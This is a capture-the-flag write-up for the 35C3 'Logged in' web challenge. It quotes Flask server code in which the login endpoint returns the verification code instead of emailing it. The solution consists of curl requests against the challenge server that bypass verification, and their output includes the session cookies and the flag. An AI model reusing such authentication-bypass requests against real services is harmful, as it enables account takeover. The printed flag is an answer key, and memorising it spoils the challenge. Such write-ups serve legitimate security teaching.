# Logged in

> Solves: 180

> Phew, we totally did not set up our mail server yet. This is bad news since nobody can get into their accounts at the moment... It'll be in our next sprint. Until then, since you cannot login: enjoy our totally finished software without account.
> http://35.207.132.47/

> Difficulty Estimate: Easy

This is one of the [Wee](../Wee) challenges.

## Analysis

The application allows us to create an account but when we try to log in we get
prompted for a code which was supposedly sent to the specified email (but
wasn't). If we take a look at the [server source](../Wee/server.py) we find that
the code can be retrieved by calling the `/api/login` endpoint:

```python
@app.route("/api/login", methods=["POST"])
def login():
    print("Logging in?")
    # TODO Send Mail
    json = request.get_json(force=True)
    login = json["email"].strip()
    try:
        userid, name, email = query_db("SELECT id, name, email FROM users WHERE email=? OR name=?", (login, login))
    except Exception as ex:
        raise Exception("UserDoesNotExist")
    return get_code(name)
```

At the same time we can see that the flag is going to be sent to us in cookeis
once we log in:

```python
@app.route("/api/verify", methods=["POST"])
def verify():
    code = request.get_json(force=True)["code"].strip()
    if not code:
        raise Exception("CouldNotVerifyCode")
    userid, = query_db("SELECT userId FROM userCodes WHERE code=?", code)
    db = get_db()
    c = db.cursor()
    c.execute("DELETE FROM userCodes WHERE userId=?", (userid,))
    token = random_code(32)
    c.execute("INSERT INTO userTokens (userId, token) values(?,?)", (userid, token))
    db.commit()
    name, = query_db("SELECT name FROM users WHERE id=?", (userid,))
    resp = make_response()
    resp.set_cookie("token", token, max_age=2 ** 31 - 1)
    resp.set_cookie("name", name, max_age=2 ** 31 - 1)
    resp.set_cookie("logged_in", LOGGED_IN)
    return resp
```

## Solution

When we already have an account it's enough to retrieve the code. The entire
process including registration is shown below:

```
liquid$> curl -X POST http://35.207.132.47//api/signup -d '{ "email": "liquid@hts", "name": "liquid" }'
{"success":true}
liquid$> curl -X POST http://35.207.132.47/api/login -d '{ "email": "liquid" }'
yrbkma
liquid$> curl -X POST http://35.207.132.47/api/verify -d '{ "code": "yrbkma" }' -c -
# Netscape HTTP Cookie File
# https://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

35.207.132.47   FALSE   /       FALSE   3694028367      token   hkqljigzzafwdrampwkpzvddhvvtdvyz
35.207.132.47   FALSE   /       FALSE   3694028367      name    liquid
35.207.132.47   FALSE   /       FALSE   0       logged_in 35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS
```
